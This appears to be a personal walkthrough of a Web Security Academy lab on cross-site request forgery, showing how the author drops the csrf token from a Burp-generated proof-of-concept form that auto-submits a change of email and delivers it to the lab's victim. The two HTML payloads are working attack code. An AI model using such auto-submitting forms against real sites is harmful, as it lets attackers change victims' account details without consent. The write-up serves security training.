![[Pasted image 20241230204303.png]]
main blog page
![[Pasted image 20241230204343.png]]
navigate to `My account` and login as `wiener`, once logged in use `update email` with `test@local.com` to get a post request
![[Pasted image 20241230204432.png]]
send to repeater
![[Pasted image 20241230204632.png]]
generate a `CSRF` payload
![[Pasted image 20241230204721.png]]
original
```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a9f00d203498f86863b0cff00520041.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;local&#46;com" />
      <input type="hidden" name="csrf" value="VC3n0FnLzy8kDqWgclJ5i8TR0DIw0cg3" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
and delete the `CSRF` field
```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a9f00d203498f86863b0cff00520041.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;local&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
copy and paste the `deleted CSRF` field payload into the test section, we see that the email did get changed so we know it worked
![[Pasted image 20241230204844.png]]
change the payload to `test2@local.com` and deliver to victim
![[Pasted image 20241230204925.png]]
profit
![[Pasted image 20241230204940.png]]

![[Pasted image 20241230205004.png]]